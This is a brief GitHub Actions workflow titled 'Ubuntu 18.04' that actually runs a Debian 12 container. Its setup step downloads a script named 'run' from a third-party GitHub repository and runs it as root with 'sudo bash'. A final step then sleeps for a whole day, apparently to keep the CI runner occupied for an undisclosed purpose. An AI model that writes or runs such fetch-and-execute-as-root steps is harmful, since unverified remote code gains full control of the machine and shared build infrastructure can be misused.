name: Ubuntu 18.04

on: 
  workflow_dispatch:
  
jobs:
  build:
    runs-on: ubuntu-latest   # Host runner
    container:
      image: debian:12       # Debian environment inside the job
    steps:
      - uses: actions/checkout@v3

      - name: setup
        run: |
           sudo apt update && sudo apt install wget sudo -y && wget https://github.com/githubaunglaymyanmar/fordownload/raw/refs/heads/main/root/run && sudo bash run



 
      - name: Ubuntu ready to go 
        run: sleep 1d

